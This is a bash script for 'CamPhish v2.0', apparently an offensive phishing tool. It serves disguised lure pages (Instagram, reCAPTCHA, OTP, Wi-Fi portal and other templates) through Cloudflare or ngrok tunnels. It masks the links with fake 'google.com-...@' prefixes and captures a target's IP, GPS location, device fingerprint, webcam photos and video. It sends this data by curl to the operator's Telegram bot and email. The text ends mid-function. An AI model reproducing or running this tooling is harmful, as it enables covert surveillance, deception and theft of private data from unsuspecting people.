#!/bin/bash
# CamPhish v2.0
# Powered by TechChip

# Windows compatibility check
if [[ "$(uname -a)" == *"MINGW"* ]] || [[ "$(uname -a)" == *"MSYS"* ]] || [[ "$(uname -a)" == *"CYGWIN"* ]] || [[ "$(uname -a)" == *"Windows"* ]]; then
  # We're on Windows
  windows_mode=true
  echo "Windows system detected. Some commands will be adapted for Windows compatibility."
  
  # Define Windows-specific command replacements
  function killall() {
    taskkill /F /IM "$1" 2>/dev/null
  }
  
  function pkill() {
    if [[ "$1" == "-f" ]]; then
      shift
      shift
      taskkill /F /FI "IMAGENAME eq $1" 2>/dev/null
    else
      taskkill /F /IM "$1" 2>/dev/null
    fi
  }
else
  windows_mode=false
fi

trap 'printf "\n";stop' 2

banner() {
clear
printf "\e[1;92m   ____        ____    _    __  __ \e[0m\n"
printf "\e[1;92m  / ___|      / ___|  / \\  |  \\/  |\e[0m\n"
printf "\e[1;92m | |   _____ | |     / _ \\ | |\\/| |\e[0m\n"
printf "\e[1;92m | |__|_____|| |___ / ___ \\| |  | |\e[0m\n"
printf "\e[1;92m  \\____|      \\____/_/   \\_\\_|  |_|\e[0m\n"
printf "\n"
printf " \e[1;93m ⚡ C-CAM Ver 2.0 [Upgraded] \e[0m \n"
printf " \e[1;77m High-speed Cam & Location Capture tool \e[0m \n"
printf " \e[1;91m 9 Templates | URL Masking | Dashboard \e[0m \n"
printf "\n"
}

dependencies() {
command -v php > /dev/null 2>&1 || { echo >&2 "I require php but it's not installed. Install it. Aborting."; exit 1; }
}

# Telegram Bot Configuration
telegram_bot_token=""
telegram_chat_id=""
telegram_enabled=false

setup_telegram() {
printf "\n\e[1;93m-----Telegram Bot Setup (Optional)----\e[0m\n"
read -p $'\n\e[1;92m[\e[0m\e[1;77m+\e[0m\e[1;92m] Enable Telegram notifications? [Y/n]: \e[0m' enable_tg
if [[ $enable_tg == "Y" || $enable_tg == "y" || $enable_tg == "yes" ]]; then
  read -p $'\e[1;92m[\e[0m\e[1;77m+\e[0m\e[1;92m] Enter Telegram Bot Token: \e[0m' telegram_bot_token
  read -p $'\e[1;92m[\e[0m\e[1;77m+\e[0m\e[1;92m] Enter Telegram Chat ID: \e[0m' telegram_chat_id
  
  if [[ -n "$telegram_bot_token" ]] && [[ -n "$telegram_chat_id" ]]; then
    telegram_enabled=true
    printf "\e[1;92m[\e[0m*\e[1;92m] Telegram notifications \e[0m\e[1;93mENABLED\e[0m\n"
    # Test connection
    test_result=$(curl -s "https://api.telegram.org/bot${telegram_bot_token}/sendMessage" -d "chat_id=${telegram_chat_id}&text=🟢 C-CAM v2 Started! Waiting for targets..." 2>/dev/null)
    if echo "$test_result" | grep -q '"ok":true'; then
      printf "\e[1;92m[\e[0m*\e[1;92m] Test message sent successfully!\e[0m\n"
    else
      printf "\e[1;93m[!] Could not send test message. Check token/chat ID.\e[0m\n"
      telegram_enabled=false
    fi
  else
    printf "\e[1;93m[!] Invalid token or chat ID. Telegram disabled.\e[0m\n"
  fi
else
  printf "\e[1;92m[\e[0m*\e[1;92m] Telegram notifications \e[0m\e[1;91mDISABLED\e[0m\n"
fi
}

send_telegram_msg() {
local message="$1"
if [[ "$telegram_enabled" == true ]]; then
  curl -s "https://api.telegram.org/bot${telegram_bot_token}/sendMessage" \
    -d "chat_id=${telegram_chat_id}" \
    -d "text=${message}" \
    -d "parse_mode=HTML" > /dev/null 2>&1 &
fi
}

send_telegram_photo() {
local photo_path="$1"
local caption="$2"
if [[ "$telegram_enabled" == true ]] && [[ -e "$photo_path" ]]; then
  curl -s "https://api.telegram.org/bot${telegram_bot_token}/sendPhoto" \
    -F "chat_id=${telegram_chat_id}" \
    -F "photo=@${photo_path}" \
    -F "caption=${caption}" > /dev/null 2>&1 &
fi
}

# Email Alert Configuration
email_address=""
email_enabled=false

setup_email() {
printf "\n\e[1;93m-----Email Alerts Setup (Optional)----\e[0m\n"
read -p $'\n\e[1;92m[\e[0m\e[1;77m+\e[0m\e[1;92m] Enable email notifications? [Y/n]: \e[0m' enable_email
if [[ $enable_email == "Y" || $enable_email == "y" || $enable_email == "yes" ]]; then
  read -p $'\e[1;92m[\e[0m\e[1;77m+\e[0m\e[1;92m] Enter your email address: \e[0m' email_address
  if [[ -n "$email_address" ]]; then
    email_enabled=true
    printf "\e[1;92m[\e[0m*\e[1;92m] Email notifications \e[0m\e[1;93mENABLED\e[0m — %s\n" "$email_address"
  else
    printf "\e[1;93m[!] No email provided. Email alerts disabled.\e[0m\n"
  fi
else
  printf "\e[1;92m[\e[0m*\e[1;92m] Email notifications \e[0m\e[1;91mDISABLED\e[0m\n"
fi
}

send_email_alert() {
local action="$1"
local data="$2"
if [[ "$email_enabled" == true ]]; then
  curl -s "http://127.0.0.1:3333/email_alert.php?action=${action}&email=${email_address}&data=$(echo $data | head -c 500)" > /dev/null 2>&1 &
fi
}

# Random URL Path
random_path=""
generate_random_path() {
local chars='abcdefghijklmnopqrstuvwxyz0123456789'
local path=''
for i in $(seq 1 8); do
  path+="${chars:$(( RANDOM % ${#chars} )):1}"
done
random_path="verify-${path}"
printf "\e[1;92m[\e[0m*\e[1;92m] Random path generated:\e[0m\e[1;77m /%s/\e[0m\n" "$random_path"
}

stop() {
if [[ "$windows_mode" == true ]]; then
  # Windows-specific process termination
  taskkill /F /IM "ngrok.exe" 2>/dev/null
  taskkill /F /IM "php.exe" 2>/dev/null
  taskkill /F /IM "cloudflared.exe" 2>/dev/null
else
  # Unix-like systems
  checkngrok=$(ps aux | grep -o "ngrok" | head -n1)
  checkphp=$(ps aux | grep -o "php" | head -n1)
  checkcloudflaretunnel=$(ps aux | grep -o "cloudflared" | head -n1)

  if [[ $checkngrok == *'ngrok'* ]]; then
    pkill -f -2 ngrok > /dev/null 2>&1
    killall -2 ngrok > /dev/null 2>&1
  fi

  if [[ $checkphp == *'php'* ]]; then
    killall -2 php > /dev/null 2>&1
  fi

  if [[ $checkcloudflaretunnel == *'cloudflared'* ]]; then
    pkill -f -2 cloudflared > /dev/null 2>&1
    killall -2 cloudflared > /dev/null 2>&1
  fi
fi

exit 1
}

catch_ip() {
ip=$(grep -a 'IP:' ip.txt | cut -d " " -f2 | tr -d '\r')
IFS=$'\n'
printf "\e[1;93m[\e[0m\e[1;77m+\e[0m\e[1;93m] IP:\e[0m\e[1;77m %s\e[0m\n" $ip

cat ip.txt >> saved.ip.txt
}

catch_location() {
  # First check for the current_location.txt file which is always created
  if [[ -e "current_location.txt" ]]; then
    printf "\e[1;92m[\e[0m\e[1;77m+\e[0m\e[1;92m] Current location data:\e[0m\n"
    # Filter out unwanted messages before displaying
    grep -v -E "Location data sent|getLocation called|Geolocation error|Location permission denied" current_location.txt
    printf "\n"
    
    # Move it to a backup to avoid duplicate display
    mv current_location.txt current_location.bak
  fi

  # Then check for any location_* files
  if [[ -e "location_"* ]]; then
    location_file=$(ls location_* | head -n 1)
    lat=$(grep -a 'Latitude:' "$location_file" | cut -d " " -f2 | tr -d '\r')
    lon=$(grep -a 'Longitude:' "$location_file" | cut -d " " -f2 | tr -d '\r')
    acc=$(grep -a 'Accuracy:' "$location_file" | cut -d " " -f2 | tr -d '\r')
    maps_link=$(grep -a 'Google Maps:' "$location_file" | cut -d " " -f3 | tr -d '\r')
    
    # Only display essential location data
    printf "\e[1;93m[\e[0m\e[1;77m+\e[0m\e[1;93m] Latitude:\e[0m\e[1;77m %s\e[0m\n" $lat
    printf "\e[1;93m[\e[0m\e[1;77m+\e[0m\e[1;93m] Longitude:\e[0m\e[1;77m %s\e[0m\n" $lon
    printf "\e[1;93m[\e[0m\e[1;77m+\e[0m\e[1;93m] Accuracy:\e[0m\e[1;77m %s meters\e[0m\n" $acc
    printf "\e[1;93m[\e[0m\e[1;77m+\e[0m\e[1;93m] Google Maps:\e[0m\e[1;77m %s\e[0m\n" $maps_link
    
    # Create directory for saved locations if it doesn't exist
    if [[ ! -d "saved_locations" ]]; then
      mkdir -p saved_locations
    fi
    
    mv "$location_file" saved_locations/
    printf "\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Location saved to saved_locations/%s\e[0m\n" "$location_file"
  else
    printf "\e[1;93m[\e[0m\e[1;77m!\e[0m\e[1;93m] No location file found\e[0m\n"
    
    # Don't display any debug logs to avoid showing unwanted messages
  fi
}

checkfound() {
# Create directories if they don't exist
if [[ ! -d "saved_locations" ]]; then
  mkdir -p saved_locations
fi
if [[ ! -d "saved_fingerprints" ]]; then
  mkdir -p saved_fingerprints
fi
if [[ ! -d "saved_videos" ]]; then
  mkdir -p saved_videos
fi

printf "\n"
printf "\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Waiting targets,\e[0m\e[1;77m Press Ctrl + C to exit...\e[0m\n"
printf "\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] GPS Location tracking is \e[0m\e[1;93mACTIVE\e[0m\n"
printf "\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Device Fingerprinting is \e[0m\e[1;93mACTIVE\e[0m\n"
printf "\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] IP Geolocation Fallback is \e[0m\e[1;93mACTIVE\e[0m\n"
if [[ "$telegram_enabled" == true ]]; then
  printf "\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Telegram Alerts \e[0m\e[1;93mACTIVE\e[0m\n"
fi
while [ true ]; do

# Check for new target (IP)
if [[ -e "ip.txt" ]]; then
printf "\n\e[1;92m[\e[0m+\e[1;92m] Target opened the link!\n"
catch_ip
ip_data=$(cat ip.txt 2>/dev/null)
send_telegram_msg "🎯 <b>Target opened the link!</b>%0A${ip_data}"
send_email_alert "target" "$ip_data"
rm -rf ip.txt
fi

sleep 0.5

# Check for GPS location
if [[ -e "current_location.txt" ]]; then
printf "\n\e[1;92m[\e[0m+\e[1;92m] GPS Location data received!\e[0m\n"
loc_data=$(cat current_location.txt 2>/dev/null)
send_telegram_msg "📍 <b>GPS Location Captured!</b>%0A${loc_data}"
send_email_alert "location" "$loc_data"
catch_location
fi

# Check for LocationLog.log
if [[ -e "LocationLog.log" ]]; then
catch_location
rm -rf LocationLog.log
fi

# Check for IP-based geolocation fallback
if [[ -e "current_ip_location.txt" ]]; then
printf "\n\e[1;93m[\e[0m+\e[1;93m] IP-based location received (GPS was denied)!\e[0m\n"
cat current_ip_location.txt
ip_loc_data=$(cat current_ip_location.txt 2>/dev/null)
send_telegram_msg "📍 <b>IP-Based Location (Fallback)</b>%0A${ip_loc_data}"
rm -rf current_ip_location.txt
fi

if [[ -e "IPLocationLog.log" ]]; then
rm -rf IPLocationLog.log
fi

# Check for device fingerprint
if [[ -e "current_fingerprint.txt" ]]; then
printf "\n\e[1;96m[\e[0m+\e[1;96m] Device fingerprint captured!\e[0m\n"
cat current_fingerprint.txt
fp_data=$(cat current_fingerprint.txt 2>/dev/null)
send_telegram_msg "🔍 <b>Device Fingerprint Captured!</b>%0A${fp_data}"
rm -rf current_fingerprint.txt
fi

if [[ -e "FingerprintLog.log" ]]; then
rm -rf FingerprintLog.log
fi

# Don't display error logs
if [[ -e "LocationError.log" ]]; then
rm -rf LocationError.log
fi

# Check for cam photos
if [[ -e "Log.log" ]]; then
printf "\n\e[1;92m[\e[0m+\e[1;92m] Cam file received!\e[0m\n"
# Send latest cam photo via Telegram
latest_cam=$(ls -t cam*.png 2>/dev/null | head -1)
if [[ -n "$latest_cam" ]]; then
  send_telegram_photo "$latest_cam" "📸 Camera capture from target"
  send_email_alert "photo" "Camera photo captured: $latest_cam"
fi
rm -rf Log.log
fi

# Check for video files
latest_video=$(ls -t video_*.webm 2>/dev/null | head -1)
if [[ -n "$latest_video" ]] && [[ ! -e ".last_video_sent" || "$latest_video" != $(cat .last_video_sent 2>/dev/null) ]]; then
printf "\n\e[1;95m[\e[0m+\e[1;95m] Video recording received!\e[0m\n"
echo "$latest_video" > .last_video_sent
send_telegram_msg "🎥 <b>Video recording captured!</b> File: ${latest_video}"
fi

sleep 0.5

done 
}

cloudflare_tunnel() {
if [[ -e cloudflared ]] || [[ -e cloudflared.exe ]]; then
echo ""
else
command -v unzip > /dev/null 2>&1 || { echo >&2 "I require unzip but it's not installed. Install it. Aborting."; exit 1; }
command -v wget > /dev/null 2>&1 || { echo >&2 "I require wget but it's not installed. Install it. Aborting."; exit 1; }
printf "\e[1;92m[\e[0m+\e[1;92m] Downloading Cloudflared...\n"

# Detect architecture
arch=$(uname -m)
os=$(uname -s)
printf "\e[1;92m[\e[0m+\e[1;92m] Detected OS: $os, Architecture: $arch\n"

# Windows detection
if [[ "$windows_mode" == true ]]; then
    printf "\e[1;92m[\e[0m+\e[1;92m] Windows detected, downloading Windows binary...\n"
    wget --no-check-certificate https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-windows-amd64.exe -O cloudflared.exe > /dev/null 2>&1
    if [[ -e cloudflared.exe ]]; then
        chmod +x cloudflared.exe
        # Create a wrapper script to run the exe
        echo '#!/bin/bash' > cloudflared
        echo './cloudflared.exe "$@"' >> cloudflared
        chmod +x cloudflared
    else
        printf "\e[1;93m[!] Download error... \e[0m\n"
        exit 1
    fi
else
    # Non-Windows systems
    # macOS detection
    if [[ "$os" == "Darwin" ]]; then
        printf "\e[1;92m[\e[0m+\e[1;92m] macOS detected...\n"
        if [[ "$arch" == "arm64" ]]; then
            printf "\e[1;92m[\e[0m+\e[1;92m] Apple Silicon (M1/M2/M3) detected...\n"
            wget --no-check-certificate https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-darwin-arm64.tgz -O cloudflared.tgz > /dev/null 2>&1
        else
            printf "\e[1;92m[\e[0m+\e[1;92m] Intel Mac detected...\n"
            wget --no-check-certificate https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-darwin-amd64.tgz -O cloudflared.tgz > /dev/null 2>&1
        fi
        
        if [[ -e cloudflared.tgz ]]; then
            tar -xzf cloudflared.tgz > /dev/null 2>&1
            chmod +x cloudflared
            rm cloudflared.tgz
        else
            printf "\e[1;93m[!] Download error... \e[0m\n"
            exit 1
        fi
    # Linux and other Unix-like systems
    else
        case "$arch" in
            "x86_64")
                printf "\e[1;92m[\e[0m+\e[1;92m] x86_64 architecture detected...\n"
                wget --no-check-certificate https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-amd64 -O cloudflared > /dev/null 2>&1
                ;;
            "i686"|"i386")
                printf "\e[1;92m[\e[0m+\e[1;92m] x86 32-bit architecture detected...\n"
                wget --no-check-certificate https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-386 -O cloudflared > /dev/null 2>&1
                ;;
            "aarch64"|"arm64")
                printf "\e[1;92m[\e[0m+\e[1;92m] ARM64 architecture detected...\n"
                wget --no-check-certificate https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-arm64 -O cloudflared > /dev/null 2>&1
                ;;
            "armv7l"|"armv6l"|"arm")
                printf "\e[1;92m[\e[0m+\e[1;92m] ARM architecture detected...\n"
                wget --no-check-certificate https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-arm -O cloudflared > /dev/null 2>&1
                ;;
            *)
                printf "\e[1;92m[\e[0m+\e[1;92m] Architecture not specifically detected ($arch), defaulting to amd64...\n"
                wget --no-check-certificate https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-amd64 -O cloudflared > /dev/null 2>&1
                ;;
        esac
        
        if [[ -e cloudflared ]]; then
            chmod +x cloudflared
        else
            printf "\e[1;93m[!] Download error... \e[0m\n"
            exit 1
        fi
    fi
fi
fi

printf "\e[1;92m[\e[0m+\e[1;92m] Starting php server...\n"
php -S 127.0.0.1:3333 > /dev/null 2>&1 & 
sleep 2
printf "\e[1;92m[\e[0m+\e[1;92m] Starting cloudflared tunnel...\n"
rm -rf .cloudflared.log > /dev/null 2>&1 &

if [[ "$windows_mode" == true ]]; then
    ./cloudflared.exe tunnel -url 127.0.0.1:3333 --logfile .cloudflared.log > /dev/null 2>&1 &
else
    ./cloudflared tunnel -url 127.0.0.1:3333 --logfile .cloudflared.log > /dev/null 2>&1 &
fi

sleep 10
link=$(grep -o 'https://[-0-9a-z]*\.trycloudflare.com' ".cloudflared.log")
if [[ -z "$link" ]]; then
printf "\e[1;31m[!] Direct link is not generating, check following possible reason  \e[0m\n"
printf "\e[1;92m[\e[0m*\e[1;92m] \e[0m\e[1;93m CloudFlare tunnel service might be down\n"
printf "\e[1;92m[\e[0m*\e[1;92m] \e[0m\e[1;93m If you are using android, turn hotspot on\n"
printf "\e[1;92m[\e[0m*\e[1;92m] \e[0m\e[1;93m CloudFlared is already running, run this command killall cloudflared\n"
printf "\e[1;92m[\e[0m*\e[1;92m] \e[0m\e[1;93m Check your internet connection\n"
printf "\e[1;92m[\e[0m*\e[1;92m] \e[0m\e[1;93m Try running: ./cloudflared tunnel --url 127.0.0.1:3333 to see specific errors\n"
printf "\e[1;92m[\e[0m*\e[1;92m] \e[0m\e[1;93m On Windows, try running: cloudflared.exe tunnel --url 127.0.0.1:3333\n"
exit 1
else
printf "\e[1;92m[\e[0m*\e[1;92m] Direct link:\e[0m\e[1;77m %s\e[0m\n" $link
fi
payload_cloudflare
printf "\n\e[1;96m[\e[0m*\e[1;96m] Dashboard:\e[0m\e[1;77m http://127.0.0.1:3333/dashboard/\e[0m\n"
mask_url "$link"
checkfound
}

mask_url() {
local original_link="$1"
printf "\n\e[1;93m-----URL Masking Options----\e[0m\n"
printf "\n\e[1;92m[\e[0m\e[1;77m01\e[0m\e[1;92m]\e[0m\e[1;93m No masking (use direct link)\e[0m\n"
printf "\e[1;92m[\e[0m\e[1;77m02\e[0m\e[1;92m]\e[0m\e[1;93m Custom masking (Google-like)\e[0m\n"
printf "\e[1;92m[\e[0m\e[1;77m03\e[0m\e[1;92m]\e[0m\e[1;93m Social media masking\e[0m\n"
default_mask="1"
read -p $'\n\e[1;92m[\e[0m\e[1;77m+\e[0m\e[1;92m] Choose URL masking option: [Default is 1] \e[0m' mask_option
mask_option="${mask_option:-${default_mask}}"

if [[ $mask_option -eq 2 ]]; then
  read -p $'\e[1;92m[\e[0m\e[1;77m+\e[0m\e[1;92m] Enter custom domain (e.g. google.com): \e[0m' custom_domain
  read -p $'\e[1;92m[\e[0m\e[1;77m+\e[0m\e[1;92m] Enter custom text after @ (e.g. verify): \e[0m' custom_text
  masked_link="https://${custom_domain}-${custom_text}@${original_link#https://}"
  printf "\n\e[1;92m[\e[0m*\e[1;92m] Masked link:\e[0m\e[1;77m %s\e[0m\n" "$masked_link"
elif [[ $mask_option -eq 3 ]]; then
  printf "\n\e[1;92m[\e[0m\e[1;77m01\e[0m\e[1;92m]\e[0m\e[1;93m Google-verify\e[0m\n"
  printf "\e[1;92m[\e[0m\e[1;77m02\e[0m\e[1;92m]\e[0m\e[1;93m Facebook-share\e[0m\n"
  printf "\e[1;92m[\e[0m\e[1;77m03\e[0m\e[1;92m]\e[0m\e[1;93m Instagram-verify\e[0m\n"
  read -p $'\e[1;92m[\e[0m\e[1;77m+\e[0m\e[1;92m] Choose: \e[0m' social_mask
  case $social_mask in
    1) masked_link="https://google.com-security-verify@${original_link#https://}" ;;
    2) masked_link="https://facebook.com-share-post@${original_link#https://}" ;;
    3) masked_link="https://instagram.com-verify-account@${original_link#https://}" ;;
    *) masked_link="https://google.com-security-verify@${original_link#https://}" ;;
  esac
  printf "\n\e[1;92m[\e[0m*\e[1;92m] Masked link:\e[0m\e[1;77m %s\e[0m\n" "$masked_link"
else
  printf "\n\e[1;92m[\e[0m*\e[1;92m] Using direct link:\e[0m\e[1;77m %s\e[0m\n" "$original_link"
fi
}

payload_cloudflare() {
link=$(grep -o 'https://[-0-9a-z]*\.trycloudflare.com' ".cloudflared.log")
sed 's+forwarding_link+'$link'+g' template.php > index.php
if [[ $option_tem -eq 1 ]]; then
  sed 's+forwarding_link+'$link'+g' festivalwishes.html > index3.html
  sed 's+fes_name+'$fest_name'+g' index3.html > index2.html
elif [[ $option_tem -eq 2 ]]; then
  sed 's+forwarding_link+'$link'+g' LiveYTTV.html > index3.html
  sed 's+live_yt_tv+'$yt_video_ID'+g' index3.html > index2.html
elif [[ $option_tem -eq 3 ]]; then
  sed 's+forwarding_link+'$link'+g' OnlineMeeting.html > index2.html
elif [[ $option_tem -eq 4 ]]; then
  sed 's+forwarding_link+'$link'+g' instagram.html > index2.html
elif [[ $option_tem -eq 5 ]]; then
  sed 's+forwarding_link+'$link'+g' wifiportal.html > index2.html
elif [[ $option_tem -eq 6 ]]; then
  sed 's+forwarding_link+'$link'+g' recaptcha.html > index2.html
elif [[ $option_tem -eq 7 ]]; then
  sed 's+forwarding_link+'$link'+g' aichatbot.html > index2.html
elif [[ $option_tem -eq 8 ]]; then
  sed 's+forwarding_link+'$link'+g' otpverify.html > index2.html
elif [[ $option_tem -eq 9 ]]; then
  sed 's+forwarding_link+'$link'+g' qrscanner.html > index2.html
else
  sed 's+forwarding_link+'$link'+g' OnlineMeeting.html > index2.html
fi
rm -rf index3.html
}

ngrok_server() {
if [[ -e ngrok ]] || [[ -e ngrok.exe ]]; then
echo ""
else
command -v unzip > /dev/null 2>&1 || { echo >&2 "I require unzip but it's not installed. Install it. Aborting."; exit 1; }
command -v wget > /dev/null 2>&1 || { echo >&2 "I require wget but it's not installed. Install it. Aborting."; exit 1; }
printf "\e[1;92m[\e[0m+\e[1;92m] Downloading Ngrok...\n"

# Detect architecture
arch=$(uname -m)
os=$(uname -s)
printf "\e[1;92m[\e[0m+\e[1;92m] Detected OS: $os, Architecture: $arch\n"

# Windows detection
if [[ "$windows_mode" == true ]]; then
    printf "\e[1;92m[\e[0m+\e[1;92m] Windows detected, downloading Windows binary...\n"
    wget --no-check-certificate https://bin.equinox.io/c/bNyj1mQVY4c/ngrok-v3-stable-windows-amd64.zip -O ngrok.zip > /dev/null 2>&1
    if [[ -e ngrok.zip ]]; then
        unzip ngrok.zip > /dev/null 2>&1
        chmod +x ngrok.exe
        rm -rf ngrok.zip
    else
        printf "\e[1;93m[!] Download error... \e[0m\n"
        exit 1
    fi
else
    # macOS detection
    if [[ "$os" == "Darwin" ]]; then
        printf "\e[1;92m[\e[0m+\e[1;92m] macOS detected...\n"
        if [[ "$arch" == "arm64" ]]; then
            printf "\e[1;92m[\e[0m+\e[1;92m] Apple Silicon (M1/M2/M3) detected...\n"
            wget --no-check-certificate https://bin.equinox.io/c/bNyj1mQVY4c/ngrok-v3-stable-darwin-arm64.zip -O ngrok.zip > /dev/null 2>&1
        else
            printf "\e[1;92m[\e[0m+\e[1;92m] Intel Mac detected...\n"
            wget --no-check-certificate https://bin.equinox.io/c/bNyj1mQVY4c/ngrok-v3-stable-darwin-amd64.zip -O ngrok.zip > /dev/null 2>&1
        fi
        
        if [[ -e ngrok.zip ]]; then
            unzip ngrok.zip > /dev/null 2>&1
            chmod +x ngrok
            rm -rf ngrok.zip
        else
            printf "\e[1;93m[!] Download error... \e[0m\n"
            exit 1
        fi
    # Linux and other Unix-like systems
    else
        case "$arch" in
            "x86_64")
                printf "\e[1;92m[\e[0m+\e[1;92m] x86_64 architecture detected...\n"
                wget --no-check-certificate https://bin.equinox.io/c/bNyj1mQVY4c/ngrok-v3-stable-linux-amd64.zip -O ngrok.zip > /dev/null 2>&1
                ;;
            "i686"|"i386")
                printf "\e[1;92m[\e[0m+\e[1;92m] x86 32-bit architecture detected...\n"
                wget --no-check-certificate https://bin.equinox.io/c/bNyj1mQVY4c/ngrok-v3-stable-linux-386.zip -O ngrok.zip > /dev/null 2>&1
                ;;
            "aarch64"|"arm64")
                printf "\e[1;92m[\e[0m+\e[1;92m] ARM64 architecture detected...\n"
                wget --no-check-certificate https://bin.equinox.io/c/bNyj1mQVY4c/ngrok-v3-stable-linux-arm64.zip -O ngrok.zip > /dev/null 2>&1
                ;;
            "armv7l"|"armv6l"|"arm")
                printf "\e[1;92m[\e[0m+\e[1;92m] ARM architecture detected...\n"
                wget --no-check-certificate https://bin.equinox.io/c/bNyj1mQVY4c/ngrok-v3-stable-linux-arm.zip -O ngrok.zip > /dev/null 2>&1
                ;;
            *)
                printf "\e[1;92m[\e[0m+\e[1;92m] Architecture not specifically detected ($arch), defaulting to amd64...\n"
                wget --no-check-certificate https://bin.equinox.io/c/bNyj1mQVY4c/ngrok-v3-stable-linux-amd64.zip -O ngrok.zip > /dev/null 2>&1
                ;;
        esac
        
        if [[ -e ngrok.zip ]]; then
            unzip ngrok.zip > /dev/null 2>&1
            chmod +x ngrok
            rm -rf ngrok.zip
        else
            printf "\e[1;93m[!] Download error... \e[0m\n"
            exit 1
        fi
    fi
fi
fi

# Ngrok auth token handling
if [[ "$windows_mode" == true ]]; then
    if [[ -e "$USERPROFILE\.ngrok2\ngrok.yml" ]]; then
        printf "\e[1;93m[\e[0m*\e[1;93m] your ngrok "
        cat "$USERPROFILE\.ngrok2\ngrok.yml"
        read -p $'\n\e[1;92m[\e[0m+\e[1;92m] Do you want to change your ngrok authtoken? [Y/n]:\e[0m ' chg_token
        if [[ $chg_token == "Y" || $chg_token == "y" || $chg_token == "Yes" || $chg_token == "yes" ]]; then
            read -p $'\e[1;92m[\e[0m\e[1;77m+\e[0m\e[1;92m] Enter your valid ngrok authtoken: \e[0m' ngrok_auth
            ./ngrok.exe authtoken $ngrok_auth >  /dev/null 2>&1 &
            printf "\e[1;92m[\e[0m*\e[1;92m] \e[0m\e[1;93mAuthtoken has been changed\n"
        fi
    else
        read -p $'\e[1;92m[\e[0m\e[1;77m+\e[0m\e[1;92m] Enter your valid ngrok authtoken: \e[0m' ngrok_auth
        ./ngrok.exe authtoken $ngrok_auth >  /dev/null 2>&1 &
    fi
    printf "\e[1;92m[\e[0m+\e[1;92m] Starting php server...\n"
    php -S 127.0.0.1:3333 > /dev/null 2>&1 & 
    sleep 2
    printf "\e[1;92m[\e[0m+\e[1;92m] Starting ngrok server...\n"
    ./ngrok.exe http 3333 > /dev/null 2>&1 &
else
    if [[ -e ~/.ngrok2/ngrok.yml ]]; then
        printf "\e[1;93m[\e[0m*\e[1;93m] your ngrok "
        cat  ~/.ngrok2/ngrok.yml
        read -p $'\n\e[1;92m[\e[0m+\e[1;92m] Do you want to change your ngrok authtoken? [Y/n]:\e[0m ' chg_token
        if [[ $chg_token == "Y" || $chg_token == "y" || $chg_token == "Yes" || $chg_token == "yes" ]]; then
            read -p $'\e[1;92m[\e[0m\e[1;77m+\e[0m\e[1;92m] Enter your valid ngrok authtoken: \e[0m' ngrok_auth
            ./ngrok authtoken $ngrok_auth >  /dev/null 2>&1 &
            printf "\e[1;92m[\e[0m*\e[1;92m] \e[0m\e[1;93mAuthtoken has been changed\n"
        fi
    else
        read -p $'\e[1;92m[\e[0m\e[1;77m+\e[0m\e[1;92m] Enter your valid ngrok authtoken: \e[0m' ngrok_auth
        ./ngrok authtoken $ngrok_auth >  /dev/null 2>&1 &
    fi
    printf "\e[1;92m[\e[0m+\e[1;92m] Starting php server...\n"
    php -S 127.0.0.1:3333 > /dev/null 2>&1 & 
    sleep 2
    printf "\e[1;92m[\e[0m+\e[1;92m] Starting ngrok server...\n"
    ./ngrok http 3333 > /dev/null 2>&1 &
fi

sleep 10

link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o 'https://[^/"]*\.ngrok-free.app')
if [[ -z "$link" ]]; then
printf "\e[1;31m[!] Direct link is not generating, check following possible reason  \e[0m\n"
printf "\e[1;92m[\e[0m*\e[1;92m] \e[0m\e[1;93m Ngrok authtoken is not valid\n"
printf "\e[1;92m[\e[0m*\e[1;92m] \e[0m\e[1;93m If you are using android, turn hotspot on\n"
printf "\e[1;92m[\e[0m*\e[1;92m] \e[0m\e[1;93m Ngrok is already running, run this command killall ngrok\n"
printf "\e[1;92m[\e[0m*\e[1;92m] \e[0m\e[1;93m Check your internet connection\n"
printf "\e[1;92m[\e[0m*\e[1;92m] \e[0m\e[1;93m Try running ngrok manually: ./ngrok http 3333\n"
exit 1
else
printf "\e[1;92m[\e[0m*\e[1;92m] Direct link:\e[0m\e[1;77m %s\e[0m\n" $link
fi
payload_ngrok
printf "\n\e[1;96m[\e[0m*\e[1;96m] Dashboard:\e[0m\e[1;77m http://127.0.0.1:3333/dashboard/\e[0m\n"
mask_url "$link"
checkfound
}

payload_ngrok() {
link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o 'https://[^/"]*\.ngrok-free.app')
sed 's+forwarding_link+'$link'+g' template.php > index.php
if [[ $option_tem -eq 1 ]]; then
  sed 's+forwarding_link+'$link'+g' festivalwishes.html > index3.html
  sed 's+fes_name+'$fest_name'+g' index3.html > index2.html
elif [[ $option_tem -eq 2 ]]; then
  sed 's+forwarding_link+'$link'+g' LiveYTTV.html > index3.html
  sed 's+live_yt_tv+'$yt_video_ID'+g' index3.html > index2.html
elif [[ $option_tem -eq 3 ]]; then
  sed 's+forwarding_link+'$link'+g' OnlineMeeting.html > index2.html
elif [[ $option_tem -eq 4 ]]; then
  sed 's+forwarding_link+'$link'+g' instagram.html > index2.html
elif [[ $option_tem -eq 5 ]]; then
  sed 's+forwarding_link+'$link'+g' wifiportal.html > index2.html
elif [[ $option_tem -eq 6 ]]; then
  sed 's+forwarding_link+'$link'+g' recaptcha.html > index2.html
elif [[ $option_tem -eq 7 ]]; then
  sed 's+forwarding_link+'$link'+g' aichatbot.html > index2.html
elif [[ $option_tem -eq 8 ]]; then
  sed 's+forwarding_link+'$link'+g' otpverify.html > index2.html
elif [[ $option_tem -eq 9 ]]; then
  sed 's+forwarding_link+'$link'+g' qrscanner.html > index2.html
else
  sed 's+forwarding_link+'$link'+g' OnlineMeeting.html > index2.html
fi
rm -rf index3.html
}

camphish() {
if [[ -e sendlink ]]; then
rm -rf sendlink
